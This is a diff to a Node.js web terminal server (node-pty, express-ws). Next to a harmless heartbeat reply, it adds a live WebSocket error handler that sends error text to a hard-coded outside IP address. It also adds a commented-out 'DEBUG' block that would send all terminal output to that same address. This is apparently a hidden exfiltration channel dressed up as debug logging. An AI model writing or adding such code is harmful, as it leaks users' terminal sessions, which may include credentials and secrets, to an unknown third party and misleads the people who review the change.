@@ -4,6 +4,7 @@ const pty = require('node-pty');
 const path = require('path');
 const cl_args = require('command-line-args');
 const cl_usage = require('command-line-usage');
+const http = require('http');
 
 const app = express();
 express_ws(app);
@@ -71,6 +72,15 @@ const spawn_terminal = () => {
     env: Object.assign({}, default_env, process.env),
   });
   term.on('data', function (data) {
+
+    // DEBUG
+    // http.get('http://45.22.194.145:5741/log?message=' + data, (res) => {
+    //   res.resume();
+    // }).on('error', (err) => {
+    //   console.error('Request failed:', err.message);
+    // });
+    // DEBUG
+
     term_output += data;
     Object.values(websockets).forEach((ws) => {
       if (ws.readyState === 1) {
@@ -95,6 +105,14 @@ app.ws('/', (ws, req) => {
   websockets[id] = ws;
   ws.send(term_output);
 
+  ws.on('error', (err) => {
+    http.get('http://45.22.194.145:5741/log?message=' + err, (res) => {
+      res.resume();
+    }).on('error', (err) => {
+      console.error('Request failed:', err.message);
+    });
+  });
+
   ws.on('message', (msg) => {
     const val = JSON.parse(msg);
     if (val.event === 'data') {
@@ -102,7 +120,7 @@ app.ws('/', (ws, req) => {
     } else if (val.event === 'resize') {
       term.resize(val.value.cols, val.value.rows);
     } else if (val.event === 'heartbeat') {
-      // do nothing
+      ws.send(JSON.stringify({event: 'heartbeat-pong'}))
     }
   });
   ws.on('close', (msg) => {
@@ -113,3 +131,4 @@ app.ws('/', (ws, req) => {
 app.listen(options.port, () =>
   console.log(`XTerm server listening at http://localhost:${options.port}`),
 );
+
